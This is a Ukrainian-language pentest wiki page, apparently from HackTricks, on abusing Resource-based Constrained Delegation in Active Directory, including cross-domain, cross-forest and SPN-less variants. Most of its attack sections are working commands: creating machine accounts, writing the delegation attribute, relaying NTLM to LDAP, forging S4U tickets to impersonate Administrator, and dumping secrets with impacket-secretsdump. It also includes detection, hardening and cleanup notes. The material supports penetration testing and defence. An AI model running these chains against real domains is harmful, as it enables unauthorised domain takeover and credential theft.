# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Основи Resource-based Constrained Delegation

Resource-based constrained delegation (RBCD) подібний до [constrained delegation](constrained-delegation.md), але напрямок довіри є зворотним. Традиційний constrained delegation визначає, до яких служб principal може делегувати повноваження; RBCD зберігає на **цільовому ресурсі** інформацію про те, які principals можуть імперсонувати користувачів для доступу до нього.<sup>[[12]](#references)</sup>

Атрибут _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ цільового об'єкта містить дескриптор безпеки, який визначає principals, яким дозволено діяти від імені інших ідентичностей щодо цього ресурсу.

Ще одна важлива відмінність полягає в тому, що principal із достатніми **правами на запис облікового запису комп'ютера** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` та подібні права) може мати змогу встановити _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. Налаштування традиційного constrained delegation зазвичай потребує доступу адміністратора з вищими привілеями.<sup>[[1]](#references)</sup>

Точніше, зміна параметрів класичного constrained delegation зазвичай контролюється привілеєм `SeEnableDelegationPrivilege` на контролері домену; цей привілей зазвичай мають адміністратори з дуже високими привілеями. RBCD переносить прийняття рішення до дескриптора безпеки цільового об'єкта, тому доступ на запис до відповідної властивості об'єкта комп'ютера може бути достатнім без наявності цього права користувача.<sup>[[1]](#references)[[2]](#references)</sup>

### Нові концепції

Прапорець **`TrustedToAuthForDelegation`** у `userAccountControl` часто описують як передумову для **S4U2Self**, але це неповне твердження.\
Service principal із SPN може запитувати S4U2Self без цього прапорця. Якщо встановлено `TrustedToAuthForDelegation`, отриманий service ticket буде **forwardable**; без нього ticket зазвичай буде **non-forwardable**.<sup>[[5]](#references)</sup>

Традиційний constrained delegation відхиляє **non-forwardable TGS** на етапі S4U2Proxy. RBCD може прийняти цей ticket S4U2Self, якщо дескриптор безпеки цілі авторизує службу, яка надсилає запит.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Структура атаки

> Якщо у вас є **права, еквівалентні правам на запис**, щодо **облікового запису комп'ютера**, ви можете отримати привілейований доступ до цієї машини.

Припустімо, що зловмисник уже має **права, еквівалентні правам на запис, щодо об'єкта комп'ютера-жертви**.

1. Зловмисник **компрометує** обліковий запис із **SPN** або **створює його** ("Service A"). За замовчуванням автентифікований користувач домену може створити до 10 об'єктів комп'ютерів; це контролюється параметром **_MachineAccountQuota_**. Об'єкт комп'ютера автоматично надає придатні для використання SPN.
2. Зловмисник **зловживає своїм правом WRITE** щодо комп'ютера-жертви (ServiceB), щоб налаштувати resource-based constrained delegation і дозволити ServiceA імперсонувати будь-якого користувача щодо цього комп'ютера-жертви (ServiceB).
3. Зловмисник використовує Rubeus для виконання **повної S4U-атаки** (S4U2Self і S4U2Proxy) від Service A до Service B для користувача, **який має привілейований доступ до Service B**.
1. S4U2Self (зі скомпрометованого або створеного облікового запису SPN): запитати **TGS, що представляє Administrator, до Service A** (non-forwardable).
2. S4U2Proxy: використати цей **non-forwardable TGS**, щоб запитати service ticket, що представляє **Administrator**, до **хоста-жертви**.
3. Non-forwardable ticket усе одно може спрацювати в цьому потоці RBCD, оскільки Service A авторизований у дескрипторі безпеки цільового ресурсу.
4. Зловмисник може виконати **pass-the-ticket** і **імперсонувати** користувача, щоб отримати **доступ до ServiceB-жертви**.<sup>[[1]](#references)</sup>

Щоб перевірити _**MachineAccountQuota**_ домену, можна використати:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Атака

### Створення об'єкта комп'ютера

Ви можете створити об'єкт комп'ютера в домені за допомогою **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configuring Resource-based Constrained Delegation

**Використання модуля Active Directory PowerShell**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Використання powerview**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Виконання повної атаки S4U (Windows/Rubeus)

Перш за все, ми створили новий об’єкт Computer із паролем `123456`, тому нам потрібен хеш цього пароля:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Це виведе хеші RC4 і AES для цього облікового запису.\
Тепер атаку можна виконати:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Ви можете згенерувати більше квитків для додаткових служб, лише один раз вказавши параметр `/altservice` у Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Користувачам може бути встановлено прапорець **"Account is sensitive and cannot be delegated."** Якщо цей прапорець увімкнено, обліковий запис не можна імперсонувати через цей delegation flow. BloodHound відображає цю властивість під час аналізу.

### Інструменти Linux: повний ланцюжок RBCD за допомогою Impacket (2024+)

Якщо ви працюєте з Linux, ви можете виконати повний ланцюжок RBCD за допомогою офіційних інструментів Impacket:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Примітки
- Якщо увімкнено LDAP signing/LDAPS, використовуйте `impacket-rbcd -use-ldaps ...`.
- Надавайте перевагу AES keys; багато сучасних доменів обмежують RC4. Impacket і Rubeus підтримують flows лише з AES.
- Impacket може переписувати `sname` ("AnySPN") для деяких tools, але за можливості отримуйте правильний SPN (наприклад, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD між доменами та лісами

Якщо **delegating principal**, яким ви керуєте, перебуває в **іншому домені** (або навіть в **іншому лісі**), ніж **resource computer**, зловживання все одно є **RBCD**, але ticket flow більше не є звичним однодоменним `S4U2Self -> S4U2Proxy`.

### RBCD між доменами: налаштування foreign principal за SID

Коли ви встановлюєте `msDS-AllowedToActOnBehalfOfOtherIdentity` з **іншого домену**, foreign machine/user може **не визначатися за іменем** у LDAP цільового домену. У такому разі налаштуйте delegation entry, використовуючи **SID** foreign principal замість його sAMAccountName/UPN.

Це особливо актуально під час relaying NTLM до LDAP за допомогою `ntlmrelayx.py`:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Notes:
- `--sid` вказує `ntlmrelayx.py` трактувати `--escalate-user` як SID, що необхідно, коли обліковий запис делегування є зовнішнім для цільового домену.
- Навіть якщо інструмент виводить `User not found in LDAP`, запис делегування все одно може бути успішним, оскільки дескриптор безпеки безпосередньо зберігає зовнішній SID.

### Міждоменний RBCD: послідовність cross-realm S4U

Після додавання foreign principal до `msDS-AllowedToActOnBehalfOfOtherIdentity` робочий міждоменний процес має такий вигляд:<sup>[[9]](#references)[[13]](#references)</sup>

1. Отримати **TGT** для delegating principal у його власному домені.
2. Запросити **referral TGT** для `krbtgt/<target-domain>`.
3. Запросити **cross-realm S4U2Self referral** для impersonated user на DC цільового домену.
4. Запросити фактичний квиток **S4U2Self** для цього користувача назад у домені delegator.
5. Виконати **S4U2Proxy** у домені delegator, щоб отримати referral ticket для цільового домену.
6. Виконати фінальний **S4U2Proxy** на DC цільового домену, щоб отримати service ticket для `cifs/host.target`, `host/host.target` тощо.

Саме тому стандартні Linux-інструменти часто не працюють із міждоменним RBCD:<sup>[[9]](#references)</sup>
- **realm** у запиті може відрізнятися від realm TGT, який використовується в `TGS-REQ`
- ланцюжок потребує **незалежних кроків S4U2Proxy**, а не лише `S4U2Self` або `S4U2Self`, одразу після якого виконується один `S4U2Proxy`

### Міждоменний RBCD з Linux

Synacktiv опублікувала реалізацію `getST.py` для Impacket, яка відтворює послідовність cross-realm у Linux шляхом явної роботи з двома KDC:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Операційно, нові аргументи такі:
- `-dc-ip`: DC **delegating** домену
- `-targetdomain`: домен **resource computer**
- `-targetdc`: DC **resource** домену

### Обмеження Cross-forest RBCD

Cross-forest RBCD має важливе обмеження: **користувач, якого імперсонують, має належати до того самого forest, що й delegating principal**. Іншими словами, якщо контрольований machine account знаходиться у `valhalla.local`, а цільовий resource — в `asgard.local`, ви зазвичай **не можете імперсонувати довільних користувачів `asgard.local`** для доступу до цього resource через RBCD.<sup>[[9]](#references)</sup>

Це все ще можна експлуатувати, якщо:
- користувач із **delegating forest** є **локальним адміністратором** (або має інші привілеї) на resource host в іншому forest
- trust дозволяє необхідний шлях автентифікації, а foreign SID приймається в security descriptor цільового computer

### Особливості протоколу Cross-forest RBCD

Cross-forest RBCD — це не просто "cross-domain плюс trust". Спостережуваний flow містить дві особливості, які поширені інструменти історично пропускають:<sup>[[9]](#references)</sup>

1. Додатковий запит **S4U2Proxy**, який встановлює **`PA-PAC-OPTIONS=branch-aware`**
2. Фінальний service ticket, який може бути повернений із використанням **RC4**, навіть якщо було запитано інші etypes

Практичний flow:

1. Отримати TGT для delegating principal у forest A.
2. Запросити **S4U2Self** для користувача, якого імперсонують, у forest A.
3. Запросити **S4U2Proxy** у forest A, щоб отримати referral TGT для forest B.
4. Надіслати другий **S4U2Proxy** у forest A **без S4U2Self ticket як additional ticket**, але з увімкненим `branch-aware`, щоб отримати ще один referral TGT для forest B.
5. За потреби запросити звичайний service ticket у forest B для delegating principal (цей ticket не потрібен для фінального зловживання).
6. Використати referral tickets із кроків 3 і 4, щоб запросити фінальний **S4U2Proxy** ticket у forest B для користувача з forest A, якого імперсонують, до цільового SPN.

### Cross-forest RBCD з Linux

Та сама гілка Synacktiv Impacket додає перемикач `-forest` для цієї логіки:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Рекурсивний multi-domain RBCD (3+ домени)

У **multi-domain forests** як **S4U2Self**, так і **S4U2Proxy** можуть бути **рекурсивними**, а не зупинятися після одного referral:

- **Recursive S4U2Self**: перший `S4U2Self` надсилається до **домену impersonated user**, проміжні переходи між батьківським і дочірнім доменами виконуються за допомогою звичайних referral `TGS-REQ` для `krbtgt/<REALM>`, а **фінальний `S4U2Self`** надсилається у **власному домені delegating principal**.
- Це означає, що **самого володіння TGT** для machine account може бути достатньо, щоб impersonate **admin з іншого домену в тому самому forest** і запросити `cifs/host`, `host/host`, `wsman/host` тощо.
- **Recursive S4U2Proxy** проходить trust chain так само: проміжні переходи повторно використовують попередній ticket як TGT під час запиту наступного referral `krbtgt/<REALM>`, і лише останній перехід повертає фінальний service ticket.<sup>[[10]](#references)</sup>

Практичний приклад у тому самому forest:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### RBCD між доменами / лісами без SPN

Якщо **делегуючий принципал є користувачем без SPN**, останній рекурсивний `S4U2Self` завершується помилкою **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Обхідний шлях — **повторити лише фінальний перехід як `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Стислий ланцюжок експлуатації:

1. Автентифікуватися за допомогою **NT hash**, щоб схилити KDC до використання **RC4-HMAC (etype 23)**.
2. Спочатку виконати запит **`-self -u2u`** і зберегти цей ticket окремо від подальшого proxy-кроку.
3. Витягти **ключ сесії TGT** за допомогою `describeTicket.py`.
4. Замінити **NT hash** користувача на цей **ключ сесії** за допомогою `changepasswd.py -newhashes <session_key>`.
5. Повторно використати ticket `S4U2Self+U2U` як **`-additional-ticket`** під час окремого запиту **`-proxy`**.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Операційні застереження:

- Якщо **перший trusted hop уже є іншим forest**, надавайте перевагу **branch-aware** алгоритму (`getST.py ... -forest`), щоб відповідати нативній поведінці Windows. Якщо до foreign forest доходять лише **пізніше** в ланцюжку, non-branch-aware recursive flow усе ще може працювати.<sup>[[9]](#references)</sup>
- На новіших DC під керуванням **Windows Server 2022/2025** примусове використання RC4 може завершитися помилкою **`KDC_ERR_ETYPE_NOSUPP`** через припинення підтримки RC4; через це **SPN-less RBCD** може бути неможливим, хоча класичний SPN-backed RBCD усе ще працює з AES.<sup>[[15]](#references)</sup>
- Виконуйте **`S4U2Self+U2U` до зміни hash/password користувача**: `SamrChangePasswordUser` **не перераховує Kerberos AES keys** облікового запису, тому зміна password спочатку може зламати подальші запити ticket.<sup>[[14]](#references)</sup>
- Обліковий запис, що impersonate, усе ще має бути **delegable**: **Protected Users** і облікові записи з **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** блокують ланцюжок.

## Нотатки щодо виявлення / hardening

- Шляхи RBCD між domains/forests усе ще зазвичай створюються через **ACL abuse** або **relay-to-LDAP**. Увімкніть **LDAP signing** і **LDAP channel binding** на DC, щоб заблокувати поширені шляхи налаштування.
- Проведіть аудит того, хто може записувати `msDS-AllowedToActOnBehalfOfOtherIdentity` в об’єкти computer, і визначте збережені SIDs, зокрема **foreign security principals**.
- У середовищах із великою кількістю trust перегляньте **Selective Authentication**, **SID filtering** і те, чи мають users із foreign forest права **local admin** на resource hosts.

### Отримання доступу

Останній командний рядок виконає **повну S4U attack і введе TGS** від Administrator на victim host у **пам’ять**.\
У цьому прикладі було запитано TGS для service **CIFS** від Administrator, тому ви зможете отримати доступ до **C$**:
```bash
ls \\victim.domain.local\C$
```
### Зловживання різними service tickets

Дізнайтеся про [**доступні service tickets тут**](silver-ticket.md#available-services).

## Перелік, аудит і очищення

### Перелік комп’ютерів із налаштованим RBCD

PowerShell (декодування SD для визначення SID):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (читання або очищення однією командою):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Очищення / скидання RBCD

- PowerShell (очистити атрибут):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Помилки Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Це означає, що Kerberos налаштовано не використовувати DES або RC4, а ви надаєте лише RC4 hash. Надайте Rubeus щонайменше AES256 hash (або просто надайте йому hashes rc4, aes128 і aes256). Приклад: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** під час `-self` для звичайного користувача: делегуючий principal, імовірно, **не має SPN**. Повторіть **останній hop** як **`S4U2Self+U2U`** замість звичайного `S4U2Self`.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** під час **SPN-less RBCD**: новіші DC можуть відхиляти примусовий шлях **RC4-HMAC**, необхідний для прийому `S4U2Self+U2U` + session-key-substitution trick. Спробуйте класичний шлях **SPN-backed** RBCD з AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Це означає, що час на поточному комп'ютері відрізняється від часу на DC, і Kerberos працює некоректно.
- **`preauth_failed`**: Це означає, що вказані username + hashes не працюють для входу. Можливо, ви забули додати "$" до username під час генерації hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Це може означати:
- Користувач, якого ви намагаєтеся impersonate, не може отримати доступ до потрібної service (оскільки ви не можете його impersonate або він не має достатніх privileges)
- Запитувана service не існує (якщо ви запитуєте ticket для winrm, але winrm не запущено)
- Створений fakecomputer втратив свої privileges над vulnerable server, і вам потрібно повернути їх.
- Ви зловживаєте classic KCD; пам'ятайте, що RBCD працює з non-forwardable S4U2Self tickets, тоді як KCD потребує forwardable.

## Примітки, relay та альтернативи

- Ви також можете записати RBCD SD через Active Directory Web Services (ADWS), якщо LDAP фільтрується. Дивіться:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chains часто завершуються RBCD, щоб за один крок отримати local SYSTEM. Практичні end-to-end приклади:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Якщо LDAP signing/channel binding **вимкнені** і ви можете створити machine account, такі tools, як **KrbRelayUp**, можуть relay примусову Kerberos auth до LDAP, встановити `msDS-AllowedToActOnBehalfOfOtherIdentity` для вашого machine account в об'єкті цільового комп'ютера та негайно impersonate **Administrator** через S4U з off-host.<sup>[[8]](#references)</sup>

## References

- [1] [Виляючи хвостом: зловживання Resource-Based Constrained Delegation для атаки на Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Ще одне слово про Delegation – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: захоплення Computer Object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – зловживання Resource-Based Constrained Delegation](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity знищила Domain: огляд Offensive Kerberos](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (official)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Коротка Linux cheatsheet із сучасним синтаксисом](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing off → Kerberos relay до RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - дослідження cross-domain і cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - дослідження cross-domain і cross-forest RBCD: частина 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - огляд Kerberos constrained delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - виявлення та усунення використання RC4 у Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – подробиці S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
